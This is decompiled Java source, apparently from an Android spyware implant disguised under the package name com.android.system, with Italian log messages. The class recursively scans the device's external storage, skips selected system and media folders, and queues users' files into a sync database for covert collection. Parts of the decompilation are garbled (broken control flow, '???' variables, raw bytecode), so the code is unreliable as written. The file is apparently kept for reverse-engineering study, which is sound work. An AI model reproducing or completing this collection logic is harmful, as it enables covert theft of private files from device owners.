package com.android.system;

import android.content.Context;
import android.os.Environment;
import com.app.system.common.entity.FileEntry;
import com.app.system.common.h.g;
import com.security.d.a;
import java.io.File;
import java.io.IOException;

public class c
{
  private static c a;
  private Context b = null;
  private boolean c = false;
  
  public static c a()
  {
    try
    {
      if (a == null)
      {
        localc = new com/android/system/c;
        localc.<init>();
        a = localc;
      }
      c localc = a;
      return localc;
    }
    finally {}
  }
  
  public void a(Context paramContext)
  {
    a.d("FileSystemScanner", "Inizializzazione...", new Object[0]);
    this.b = paramContext;
    b();
    FileSystemScanReceiver.a(paramContext);
  }
  
  public void b()
  {
    if (!this.c) {
      new a().start();
    } else {
      a.b("FileSystemScanner", "La scansione è già in corso", new Object[0]);
    }
  }
  
  private class a
    extends Thread
  {
    private g b = new g(c.a(c.this));
    private final File c = Environment.getExternalStorageDirectory();
    private final String[] d = { new File(this.c, ".data").getAbsolutePath().toLowerCase(), new File(this.c, "Android/data").getAbsolutePath().toLowerCase(), new File(this.c, "Android/media").getAbsolutePath().toLowerCase(), new File(this.c, "Android/obb").getAbsolutePath().toLowerCase(), new File(this.c, "Movies").getAbsolutePath().toLowerCase(), new File(this.c, "Music").getAbsolutePath().toLowerCase(), new File(this.c, "Notifications").getAbsolutePath().toLowerCase(), new File(this.c, "Ringtones").getAbsolutePath().toLowerCase() };
    private final String[] e = { ".thumbnail" };
    
    public a()
    {
      super();
    }
    
    private void a(File paramFile)
    {
      File[] arrayOfFile = paramFile.listFiles();
      int i = arrayOfFile.length;
      int j = 0;
      while (j < i)
      {
        Object localObject1 = arrayOfFile[j];
        try
        {
          boolean bool = FileEntry.a((File)localObject1);
          if (!bool) {}
          Object localObject2;
          j++;
        }
        catch (IOException paramFile)
        {
          a.a("FileSystemScanner", "isSymLink:", new Object[] { paramFile });
          localObject2 = new StringBuilder();
          if (((File)localObject1).isDirectory()) {
            paramFile = "[D] ";
          } else if (((File)localObject1).isFile()) {
            paramFile = "[F] ";
          } else {
            paramFile = "[?] ";
          }
          ((StringBuilder)localObject2).append(paramFile);
          ((StringBuilder)localObject2).append(((File)localObject1).getAbsolutePath());
          paramFile = ((StringBuilder)localObject2).toString();
          if (((File)localObject1).isDirectory())
          {
            a.e("FileSystemScanner", paramFile, new Object[0]);
            if (!b((File)localObject1)) {
              a((File)localObject1);
            }
          }
          else if (((File)localObject1).isFile())
          {
            if (!c((File)localObject1))
            {
              localObject2 = new FileEntry((File)localObject1);
              if (((File)localObject1).length() > 10000000L) {
                ((FileEntry)localObject2).mSynchronized = true;
              }
              bool = this.b.a(new FileEntry((File)localObject1));
              localObject1 = new StringBuilder();
              ((StringBuilder)localObject1).append(paramFile);
              if (bool) {
                paramFile = " - AGGIORNATO";
              } else {
                paramFile = " - NON AGGIORNATO";
              }
              ((StringBuilder)localObject1).append(paramFile);
              a.e("FileSystemScanner", ((StringBuilder)localObject1).toString(), new Object[0]);
            }
            else
            {
              localObject1 = new StringBuilder();
              ((StringBuilder)localObject1).append(paramFile);
              ((StringBuilder)localObject1).append(" *** IGNORATO ***");
              a.e("FileSystemScanner", ((StringBuilder)localObject1).toString(), new Object[0]);
            }
          }
          else
          {
            a.b("FileSystemScanner", "-- Non è un file né una directory --", new Object[0]);
          }
        }
      }
    }
    
    private boolean b(File paramFile)
    {
      Object localObject;
      for (localObject : this.d) {
        if (paramFile.getAbsolutePath().toLowerCase().startsWith((String)localObject)) {
          return true;
        }
      }
      for (??? : this.e) {
        if (paramFile.getAbsolutePath().toLowerCase().contains(???)) {
          return true;
        }
      }
      return false;
    }
    
    private boolean c(File paramFile)
    {
      for (String str : this.e) {
        if (paramFile.getAbsolutePath().toLowerCase().contains(str)) {
          return true;
        }
      }
      return false;
    }
    
    /* Error */
    public void run()
    {
      // Byte code:
      //   0: invokestatic 174	com/security/ServiceSettings:a	()Lcom/security/ServiceSettings;
      //   3: getfield 177	com/security/ServiceSettings:filesActive	Z
      //   6: ifeq +202 -> 208
      //   9: aload_0
      //   10: getfield 19	com/android/system/c$a:a	Lcom/android/system/c;
      //   13: invokestatic 73	com/android/system/c:a	(Lcom/android/system/c;)Landroid/content/Context;
      //   16: ldc -77
      //   18: ldc -75
      //   20: invokestatic 186	com/security/b:a	(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
      //   23: ifeq +239 -> 262
      //   26: invokestatic 189	android/os/Environment:getExternalStorageState	()Ljava/lang/String;
      //   29: astore_1
      //   30: aload_1
      //   31: ldc -65
      //   33: invokevirtual 195	java/lang/String:equals	(Ljava/lang/Object;)Z
      //   36: ifne +47 -> 83
      //   39: aload_1
      //   40: ldc -59
      //   42: invokevirtual 195	java/lang/String:equals	(Ljava/lang/Object;)Z
      //   45: ifne +38 -> 83
      //   48: new 102	java/lang/StringBuilder
      //   51: astore_2
      //   52: aload_2
      //   53: invokespecial 105	java/lang/StringBuilder:<init>	()V
      //   56: aload_2
      //   57: ldc -57
      //   59: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   62: pop
      //   63: aload_2
      //   64: aload_1
      //   65: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   68: pop
      //   69: ldc 21
      //   71: aload_2
      //   72: invokevirtual 125	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   75: iconst_0
      //   76: anewarray 95	java/lang/Object
      //   79: invokestatic 158	com/security/d/a:b	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
      //   82: return
      //   83: invokestatic 204	android/os/SystemClock:elapsedRealtime	()J
      //   86: lstore_3
      //   87: ldc 21
      //   89: ldc -50
      //   91: iconst_0
      //   92: anewarray 95	java/lang/Object
      //   95: invokestatic 208	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
      //   98: aload_0
      //   99: getfield 19	com/android/system/c$a:a	Lcom/android/system/c;
      //   102: iconst_1
      //   103: invokestatic 211	com/android/system/c:a	(Lcom/android/system/c;Z)Z
      //   106: pop
      //   107: aload_0
      //   108: invokestatic 30	android/os/Environment:getExternalStorageDirectory	()Ljava/io/File;
      //   111: invokespecial 131	com/android/system/c$a:a	(Ljava/io/File;)V
      //   114: invokestatic 204	android/os/SystemClock:elapsedRealtime	()J
      //   117: lload_3
      //   118: lsub
      //   119: ldc2_w 212
      //   122: ldiv
      //   123: lstore_3
      //   124: aload_0
      //   125: getfield 19	com/android/system/c$a:a	Lcom/android/system/c;
      //   128: iconst_0
      //   129: invokestatic 211	com/android/system/c:a	(Lcom/android/system/c;Z)Z
      //   132: pop
      //   133: ldc 21
      //   135: ldc -41
      //   137: iconst_1
      //   138: anewarray 95	java/lang/Object
      //   141: dup
      //   142: iconst_0
      //   143: lload_3
      //   144: invokestatic 221	java/lang/Long:valueOf	(J)Ljava/lang/Long;
      //   147: aastore
      //   148: invokestatic 225	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
      //   151: iconst_0
      //   152: anewarray 95	java/lang/Object
      //   155: invokestatic 208	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
      //   158: goto +104 -> 262
      //   161: astore_2
      //   162: invokestatic 204	android/os/SystemClock:elapsedRealtime	()J
      //   165: lload_3
      //   166: lsub
      //   167: ldc2_w 212
      //   170: ldiv
      //   171: lstore_3
      //   172: aload_0
      //   173: getfield 19	com/android/system/c$a:a	Lcom/android/system/c;
      //   176: iconst_0
      //   177: invokestatic 211	com/android/system/c:a	(Lcom/android/system/c;Z)Z
      //   180: pop
      //   181: ldc 21
      //   183: ldc -41
      //   185: iconst_1
      //   186: anewarray 95	java/lang/Object
      //   189: dup
      //   190: iconst_0
      //   191: lload_3
      //   192: invokestatic 221	java/lang/Long:valueOf	(J)Ljava/lang/Long;
      //   195: aastore
      //   196: invokestatic 225	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
      //   199: iconst_0
      //   200: anewarray 95	java/lang/Object
      //   203: invokestatic 208	com/security/d/a:d	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V
      //   206: aload_2
      //   207: athrow
      //   208: ldc 21
      //   210: ldc -29
      //   212: ldc 6
      //   214: invokevirtual 232	java/lang/Class:getSimpleName	()Ljava/lang/String;
      //   217: invokestatic 237	com/security/d/b:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
      //   220: goto +42 -> 262
      //   223: astore_1
      //   224: new 102	java/lang/StringBuilder
      //   227: dup
      //   228: invokespecial 105	java/lang/StringBuilder:<init>	()V
      //   231: astore_2
      //   232: aload_2
      //   233: aload_1
      //   234: invokevirtual 240	java/lang/NullPointerException:getMessage	()Ljava/lang/String;
      //   237: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: pop
      //   241: aload_2
      //   242: ldc -14
      //   244: invokevirtual 122	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   247: pop
      //   248: ldc 21
      //   250: aload_2
      //   251: invokevirtual 125	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   254: ldc 6
      //   256: invokevirtual 232	java/lang/Class:getSimpleName	()Ljava/lang/String;
      //   259: invokestatic 237	com/security/d/b:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
      //   262: return
      // Local variable table:
      //   start	length	slot	name	signature
      //   0	263	0	this	a
      //   29	36	1	str	String
      //   223	11	1	localNullPointerException	NullPointerException
      //   51	21	2	localStringBuilder1	StringBuilder
      //   161	46	2	localObject	Object
      //   231	20	2	localStringBuilder2	StringBuilder
      //   86	106	3	l	long
      // Exception table:
      //   from	to	target	type
      //   87	114	161	finally
      //   0	82	223	java/lang/NullPointerException
      //   83	87	223	java/lang/NullPointerException
      //   114	158	223	java/lang/NullPointerException
      //   162	208	223	java/lang/NullPointerException
      //   208	220	223	java/lang/NullPointerException
    }
  }
}


/* Location:              ~/com/android/system/c.class
 *
 * Reversed by:           J
 */